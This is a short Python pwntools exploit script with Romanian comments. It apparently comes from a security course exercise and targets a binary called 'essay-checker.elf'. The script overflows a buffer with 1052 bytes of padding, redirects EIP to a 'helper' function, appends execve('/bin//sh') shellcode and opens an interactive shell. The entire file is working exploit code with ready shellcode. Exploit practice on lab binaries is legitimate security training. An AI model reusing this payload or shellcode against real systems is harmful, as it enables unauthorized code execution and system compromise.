#!/usr/bin/env python3

from pwnlib import elf
from pwnlib.tubes import process
from pwnlib.util.packing import p32
from pwn import log

EXECUTABLE_PATH = "../../ExerciÈ›ii/essay-checker/essay-checker.elf"
HELPER_SYMBOL = "helper"
EIP_OFFSET = 1052
BIN_SH_SHELLCODE = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
PAYLOAD_FILENAME = "payload.bin"


def main() -> None:
    # Preia simbolul functiei helper
    executable = elf.ELF(EXECUTABLE_PATH, checksec=False)
    helper_address = executable.symbols[HELPER_SYMBOL]
    log.info("Adresa functiei '{}' este {}.".format(HELPER_SYMBOL,
                                                    hex(helper_address)))

    # Creeaza payload-ul si salveaza-l intr-un fisier
    payload = EIP_OFFSET * b'a' + p32(helper_address) + BIN_SH_SHELLCODE
    open(PAYLOAD_FILENAME, "wb").write(payload)

    # Creeaza un proces nou pe baza executabilului
    p = process.process([EXECUTABLE_PATH, PAYLOAD_FILENAME, "0"])
    p.recv(timeout=0.1)
    p.interactive()


if __name__ == "__main__":
    main()